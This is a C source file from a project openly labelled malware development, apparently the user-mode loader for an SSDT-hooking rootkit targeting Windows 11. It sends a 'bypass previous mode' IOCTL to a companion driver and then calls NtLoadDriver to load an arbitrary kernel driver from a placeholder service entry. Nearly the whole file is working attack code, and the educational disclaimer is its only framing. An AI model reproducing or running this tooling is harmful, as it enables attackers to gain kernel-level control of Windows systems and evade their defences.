/*
╔═════════════════════════════════════════════════════════════╗
║                                                             ║
║                 ⚠️  Malware Development  ⚠️                   ║
║                                                             ║
║  @author: bekoo                                             ║
║  @website : 0xbekoo.github.io                               ║
║  @warning : This project has been developed                 ║
║              for educational purposes only.                 ║
║                                                             ║
║  @project: SSDT Hooking - UserMode Program                  ║
║  @platform: Windows 11 24H2 (Build: 26100.3194)             ║
║                                                             ║
╚═════════════════════════════════════════════════════════════╝
*/

#include "main.h"

int main(int argc, char* argv[]) {
	NtLoadDriver _NtLoadDriver;
	HANDLE HandleDevice = NULL;
	HMODULE NTDLL = NULL;
	UNICODE_STRING DriverServiceName;
	DWORD OutputBytesReturned = 0;
	BOOL Result = 0;
	DWORD dwExitCode = EXIT_SUCCESS;
	NTSTATUS Status = 0;
	
	RtlInitUnicodeString(&DriverServiceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\yourdriver");

	HandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == HandleDevice) {
		printf("Failed to connect Driver! Error Code: 0x%lx\n", GetLastError());

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}

	BOOLEAN bValue = TRUE;
	Result = DeviceIoControl(HandleDevice, IOCTL_BYPASS_PREVIOUS_MODE, &bValue, sizeof(bValue), NULL, 0, &OutputBytesReturned, NULL);
	if (!Result) {
		printf("Failed to IOCTL Code!\n");

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}

	NTDLL = GetModuleHandleA("ntdll.dll");
	if (NULL == NTDLL) {
		printf("Failed to get address of NTDLL!\n");

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}
	printf("NTDLL: 0x%p\n", NTDLL);

	_NtLoadDriver = (NtLoadDriver)GetProcAddress(NTDLL, "NtLoadDriver");
	if (NULL == _NtLoadDriver) {
		printf("Failed to get address of NtLoadDriver!\n");

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}
	printf("NtLoadDriver: 0x%p\n", _NtLoadDriver);

	Status = _NtLoadDriver(&DriverServiceName);
	if (Status != 0) {
		if (Status == 0xc000010e) {
			printf("The driver is already loaded\n");

			dwExitCode = EXIT_SUCCESS;
			goto Exit;
		}
		printf("Failed to Load Driver! Error Code: 0x%08x\n", Status);

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}
	printf("The driver was installed successfully\n");
	dwExitCode = EXIT_SUCCESS;

Exit:
	if (NTDLL) {
		FreeLibrary(NTDLL);
	}
	if (HandleDevice) {
		CloseHandle(HandleDevice);
	}

	return dwExitCode;
}
